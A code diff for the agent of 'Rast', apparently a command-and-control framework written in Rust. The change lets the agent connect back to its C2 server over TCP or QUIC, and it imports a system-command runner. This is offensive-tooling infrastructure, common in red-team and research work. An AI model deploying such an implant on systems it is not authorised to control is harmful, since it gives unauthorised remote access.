@@ -1,22 +1,18 @@
 //! The agent part of the Rast project.
 
-use std::{
-    sync::{Arc, RwLock},
-};
+use std::sync::{Arc, RwLock};
 
-use anyhow::{Result};
-
+use anyhow::{bail, Result};
 use commands::Commands;
 use futures_util::{sink::SinkExt, stream::StreamExt};
 use rast::{
     encoding::{JsonPackager, Packager},
     messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
-    protocols::{tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory},
-    settings::Settings,
+    protocols::{quic::QuicFactory, tcp::TcpFactory, Messager, ProtoConnection, ProtoFactory},
+    settings::{Connection, Settings},
     RastError,
 };
 use tokio::{process::Command as SystemCommand, sync::Mutex};
-
 use tracing::{debug, info};
 
 use crate::context::Context;
@@ -34,20 +30,31 @@ pub struct RastAgent {
 impl RastAgent {
     /// Creates new instance using provided [Settings].
     pub async fn with_settings(settings: Settings) -> Result<Self> {
-        let connection = if let Some(conf) = &settings.server.tcp {
-            TcpFactory::new_client(conf).await
-        } else {
-            Err(RastError::Network(String::from(
-                "Can't connect to C2 using TCP.",
-            )))
-        };
+        let connection = RastAgent::get_connection(&settings).await?;
 
         Ok(RastAgent {
             settings,
-            connection: connection.unwrap(),
+            connection,
             commands: Commands::new(),
             context: Arc::new(RwLock::new(Context::new())),
         })
+    }
+
+    async fn get_connection(settings: &Settings) -> Result<Arc<Mutex<dyn ProtoConnection>>> {
+        for conf in settings.agent.connections.iter() {
+            let conn = match conf {
+                Connection::Tcp(tcp_conf) => TcpFactory::new_client(tcp_conf).await,
+                Connection::Quic(quic_conf) => QuicFactory::new_client(quic_conf).await,
+                _ => bail!(RastError::Unknown),
+            };
+
+            match conn {
+                Ok(conn) => return Ok(conn),
+                Err(e) => bail!(e),
+            };
+        }
+
+        Err(RastError::Unknown.into())
     }
 
     /// Starts execution.
